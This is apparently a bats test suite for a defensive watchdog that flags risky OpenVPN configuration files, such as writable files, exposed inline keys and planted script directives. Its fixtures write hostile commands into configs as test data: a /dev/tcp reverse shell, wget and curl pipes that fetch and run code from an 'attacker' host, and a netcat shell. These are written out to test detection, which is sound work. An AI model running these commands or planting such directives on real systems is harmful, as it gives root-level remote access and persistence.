#!/usr/bin/env bats
# L2 bats functional tests for the openvpn-config-watchdog scan script.
#
# OpenVPN runs the script directives (up/down/route-up/client-connect/
# tls-verify/auth-user-pass-verify/…) AS ROOT on connect/route/auth events
# (gated by script-security) — a planted script directive is
# root-exec-on-VPN-event persistence (T1546). A .conf/.ovpn that is
# world-writable / non-root-owned, world-readable while carrying inline key
# material (`<key>`/`<tls-crypt>`/`secret`), or a script directive carrying an
# injection pattern (incl. a writable-root path), is alert.
#
# Run with: bats packaging/test/L2-openvpn-config-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/openvpn-config-watchdog/systemd/openvpn-config-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    VPND="${TMP}/openvpn"; mkdir -p "${VPND}"
    CONF="${VPND}/client.conf"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_OPENVPN_PROFILE="${PROFILE:-report}" \
    SELFDEF_OPENVPN_BASELINE="${BASELINE}" \
    SELFDEF_OPENVPN_DIRS="${DIRS_V:-$VPND}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# Benign client config: external key files (no inline key material), so a
# default-readable mode is not a key-exposure finding; a trusted up script.
seed_benign() {
    printf 'client\ndev tun\nremote vpn.example.com 1194\nup /etc/openvpn/up.sh\n' > "${CONF}"
}

@test "no openvpn configs → ok / no_openvpn" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_openvpn"'
    cap | grep -q '"severity":"ok"'
}

@test "benign config, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / openvpn_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"openvpn_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a script directive under a writable root → alert / openvpn_suspicious" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nup /tmp/.x\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"openvpn_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a script directive with an injection pattern → alert" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nup "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable config → alert" {
    seed_benign
    run_wd
    chmod 0666 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a world-readable config carrying inline key material → alert" {
    seed_benign
    run_wd
    printf 'client\ndev tun\n<key>\n-----BEGIN PRIVATE KEY-----\n</key>\n' > "${CONF}"
    chmod 0644 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign config change → warn / openvpn_changed" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nremote vpn2.example.com 1194\nup /etc/openvpn/up.sh\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"openvpn_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign external-key config is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious script directive" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nup /tmp/.x\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — openvpn config inventory enumerates VPN-event root-exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (script directive under /var/tmp): writable-root expansion" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nup /var/tmp/.attacker\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (script directive under /dev/shm): tmpfs writable-root coverage" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nup /dev/shm/.attacker\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (down script directive — symmetric to up): writable-root → alert" {
    # OpenVPN has multiple script directives (up + down + client-connect +
    # route-up + tls-verify + auth-user-pass-verify). All run AS ROOT.
    seed_benign
    run_wd
    printf 'client\ndev tun\ndown /tmp/.attacker\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (route-up script directive — symmetric to up): writable-root → alert" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nroute-up /tmp/.attacker\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh in script directive): wget bootstrap → alert" {
    seed_benign
    run_wd
    printf 'client\ndev tun\nup "wget -qO- http://attacker/p | sh"\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (<tls-crypt> inline material world-readable → alert): inline-key axis coverage symmetric to <key>" {
    seed_benign
    run_wd
    printf 'client\ndev tun\n<tls-crypt>\n-----BEGIN OpenVPN Static key V1-----\n</tls-crypt>\n' > "${CONF}"
    chmod 0644 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-openvpn -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no-auto-trust: openvpn-config-watchdog does NOT refresh baseline on suspicious-config detection — alert STAYS until operator updates)" {
    # T1546 VPN-event root-exec persistence primitive — alert MUST
    # persist across runs until operator explicitly re-baselines.
    # Sister to nm-vpn-plugin, gss-mech, ld-preload, musl-ld-path —
    # active-injection class never auto-trusts.
    seed_benign
    run_wd
    printf 'client\ndev tun\nup /tmp/.x\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (client-connect script directive — server-side symmetric to up): writable-root → alert" {
    # OpenVPN server uses client-connect (run per accepted client).
    # Sister script directive — equally root-execution surface.
    seed_benign
    run_wd
    printf 'server\ndev tun\nclient-connect /tmp/.attacker\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant in script directive): curl bootstrap → alert (sister to wget-pipe-sh axis)" {
    # Attacker may swap wget for curl, sh for bash. Watchdog must
    # catch both curl AND wget; both sh AND bash variants.
    seed_benign
    run_wd
    printf 'client\ndev tun\nup "curl -fsSL http://attacker/p | bash"\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-config scan: a second .conf in same dir ALSO scanned — not just first .conf)" {
    # OpenVPN dir may carry many client/server configs. A planted
    # config alongside benign one MUST be flagged.
    seed_benign
    printf 'client\ndev tun\nup /tmp/.evil2\n' > "${VPND}/client2.conf"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in script directive: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to many other watchdog's nc reverse-shell variant
    # INVARIANTs across the brain. OpenVPN script directives
    # (up/down/client-connect/route-up) run AS ROOT on every
    # VPN connect/disconnect/route-up — recurring trigger fires
    # the planted nc the moment a connection or route flap
    # happens. Locks the netcat axis on the VPN-event-trigger
    # root-exec persistence surface (T1546 — Event Triggered
    # Execution via VPN script directive).
    printf 'client\ndev tun\nup /bin/sh -c "nc -e /bin/sh 1.1.1.1 4444"\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}
